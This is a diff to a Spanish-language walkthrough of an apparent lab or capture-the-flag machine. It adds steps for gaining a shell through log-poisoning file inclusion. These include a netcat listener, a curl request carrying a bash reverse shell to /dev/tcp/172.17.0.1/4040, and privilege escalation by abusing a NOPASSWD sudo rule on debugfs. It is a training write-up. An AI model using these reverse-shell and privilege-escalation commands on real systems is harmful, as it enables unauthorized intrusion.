@@ -51,7 +51,21 @@ Ahora que podemos ejecutar comandos en la pagina, usaremos una terminal para esc
 ```
 nc -lvnp 4040
 ```
-En otra terminal
+En otra terminal ejecutaremos el comando que nos dara acceso.
+```
+curl -G "http://172.17.0.2/index.php" --data-urlencode "studio=/var/log/vsftpd.log" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'"
+```
+Usamos ```curl``` ya que si copiamos directamente el comando en la barra de busqueda no se ejecutara ya que google no codifica automaticamente los caracteres iniciales, por lo que lo ejecutaremos con ```curl``` y en la terminal en la que estabamos escuchando ganaremos acceso a la maquina.
+
+## Paso N6: Subiendo privilegios
+ejecutamos el comando sudo -l y nos devuelve lo siguiente:
+```
+(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
+```
+Para ganar acceso al usuario hannah ejecutaremos el siguiente comando:
+```
+sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+```
 
 
 
@@ -67,12 +81,8 @@ Raw Command
 
 
 
-```
-cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'
-```
-```
-sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
-```
+
+
 ```
 find / -perm -4000 2>/dev/null
 ```
